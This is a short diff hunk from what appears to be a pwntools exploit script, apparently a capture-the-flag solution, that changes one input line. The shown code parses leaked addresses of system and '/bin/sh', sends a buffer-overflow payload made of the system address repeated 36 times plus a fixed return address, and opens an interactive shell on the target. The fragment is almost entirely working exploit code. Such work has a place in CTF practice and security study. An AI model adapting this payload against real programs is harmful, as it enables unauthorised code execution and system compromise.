@@ -62,7 +62,7 @@ print(out)
 addr_system=out.split()[-1]
 addr_bin_sh=out.split()[-2]
 print(addr_system)
-r.send(b"/////////////////////bin/sh"+b"\n")
+r.send(b"I DON\'T NEED THIS GIFT"+b"\n")
 r.send(p32(int(addr_system,16))*36+p32(0x8048f48)+b"\n")
 r.interactive()
 
